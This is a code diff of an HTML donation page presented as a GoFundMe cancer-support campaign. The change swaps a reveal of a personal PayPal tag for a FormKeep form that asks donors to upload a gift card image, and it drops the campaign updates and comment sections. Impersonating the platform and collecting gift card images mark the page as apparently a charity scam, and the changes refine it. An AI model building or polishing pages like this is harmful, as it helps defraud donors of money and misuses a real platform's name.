@@ -42,7 +42,7 @@
 
     <section id="donate" class="py-12 px-6">
         <div class="container mx-auto">
-            <h2 class="text-3xl font-bold text-center mb-8">Make a Donation</h2>
+            <h2 class="text-3xl font-bold text-center mb-8">Make a Donation with Gift Card Upload</h2>
             <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                 <button onclick="setDonationAmount(10)" class="bg-green-600 text-white py-4 px-8 rounded-lg hover:bg-green-700 text-center">Donate $10</button>
                 <button onclick="setDonationAmount(50)" class="bg-green-600 text-white py-4 px-8 rounded-lg hover:bg-green-700 text-center">Donate $50</button>
@@ -52,86 +52,46 @@
             </div>
         </div>
     </section>
+
     <section id="donation-section" class="py-12 px-6">
         <div class="container mx-auto max-w-lg">
-            <form action="#" method="POST" target="_blank" class="bg-white shadow-lg rounded-lg p-6">
+            <form action="https://submit.formkeep.com/YOUR_FORM_ID" method="POST" enctype="multipart/form-data" class="bg-white shadow-lg rounded-lg p-6">
+                <h2 class="text-2xl font-bold mb-4">Enter Donation Amount and Upload Gift Card</h2>
                 
-                <h2 class="text-2xl font-bold mb-4">Enter Donation Amount</h2>
+                <!-- Donation amount input -->
                 <input id="amountInput" type="number" name="amount" class="w-full border border-gray-300 rounded-lg p-4 mb-4" placeholder="Enter amount in USD" required>
+
+                <!-- File upload for gift card -->
+                <label for="giftCardImage" class="block text-lg font-semibold mb-2">Upload Your Gift Card Image</label>
+                <input type="file" name="giftCardImage" id="giftCardImage" accept="image/*" required class="w-full border border-gray-300 rounded-lg p-4 mb-4">
                 
+                <input type="hidden" name="formkeep" value="YOUR_FORM_ID">
                 <input type="hidden" name="business" value="your-paypal-email@example.com">
                 <input type="hidden" name="currency_code" value="USD">
                 <input type="hidden" name="item_name" value="Donation for Cancer Support">
-    
-                <button type="button"  id="donateButton" class="bg-green-600 text-white py-2 px-6 rounded-lg hover:bg-green-700 w-full">Donate to PayPal</button>
-                
-                <!-- Hidden dropdown, initially hidden -->
-                <select id="donation-dropdown" onchange="showPayPalDetails()" style="display:none;">
-                    <option value="paypal"></option>
-                </select>
-                
-                <!-- PayPal details, initially hidden -->
-                <div id="paypal-details" style="display: none;">
-                    <div class="paypal-info">
-                        <img src="Untiled.png" alt="PayPal" />
-                        <p>PayPal Tag: <strong>@fgdjjh6yjkk@gmail.com</strong></p>
-                        <p>Name: Jolynn Franks</p>
-                    </div>
-                </div>
+
+       <!-- Embed FormKeep for file upload -->
+       <div id="formkeep-embed" data-formkeep-url="https://formkeep.com/p/eb1403d52568b66d0c3cbb0e6948caee?embedded=1"></div>
+       <script type="text/javascript" src="https://pym.nprapps.org/pym.v1.min.js"></script>
+       <script type="text/javascript" src="https://cdn.formkeep.com/formkeep-embed.js"></script>
+   
+       <!-- Get notified when the form is submitted -->
+       <script>
+           const formkeepEmbed = document.querySelector('#formkeep-embed')
+   
+           formkeepEmbed.addEventListener('formkeep-embed:submitting', _event => {
+               console.log('Submitting form...');
+           });
+   
+           formkeepEmbed.addEventListener('formkeep-embed:submitted', _event => {
+               console.log('Submitted form...');
+           });
+       </script>
             </form>
         </div>
     </section>
-    
-    <script>
-        document.getElementById('donateButton').addEventListener('click', function() {
-            // Show the dropdown when the donate button is clicked
-            const dropdown = document.getElementById('donation-dropdown');
-            dropdown.style.display = 'block'; // Make the dropdown visible
-    
-            // Trigger the onchange event to show PayPal details
-            dropdown.value = 'paypal';
-            showPayPalDetails();
-        });
-    
-        function showPayPalDetails() {
-            const dropdown = document.getElementById('donation-dropdown');
-            const paypalDetails = document.getElementById('paypal-details');
-            
-            if (dropdown.value === 'paypal') {
-                paypalDetails.style.display = 'block'; // Show PayPal details
-            } else {
-                paypalDetails.style.display = 'none'; // Hide PayPal details
-            }
-        }
-    </script>
 
-    <section id="updates" class="bg-gray-50 py-12 px-6">
-        <div class="container mx-auto">
-            <h2 class="text-3xl font-bold text-center mb-8">Campaign Updates</h2>
-            <div class="space-y-4">
-                <div class="bg-white shadow-lg rounded-lg p-6">
-                    <h3 class="text-xl font-bold">Update 1</h3>
-                    <p>We are thrilled to share that the initial round of treatments has been successful. Thank you for your continued support!</p>
-                    <span class="text-gray-500 text-sm">Posted on December 15, 2024</span>
-                </div>
-                <div class="bg-white shadow-lg rounded-lg p-6">
-                    <h3 class="text-xl font-bold">Update 2</h3>
-                    <p>Your donations have helped secure the next round of treatments. Every contribution makes a difference!</p>
-                    <span class="text-gray-500 text-sm">Posted on December 20, 2024</span>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <section id="comments" class="py-12 px-6">
-        <div class="container mx-auto">
-            <h2 class="text-3xl font-bold text-center mb-8">Leave a Comment</h2>
-            <form class="bg-white shadow-lg rounded-lg p-6">
-                <textarea class="w-full border border-gray-300 rounded-lg p-4 mb-4" rows="5" placeholder="Write your comment..."></textarea>
-                <button class="bg-green-600 text-white py-2 px-6 rounded-lg hover:bg-green-700">Submit</button>
-            </form>
-        </div>
-    </section>
 
     <footer class="bg-green-600 text-white py-4 text-center">
         <p>&copy; 2024 GoFundMe. All Rights Reserved.</p>
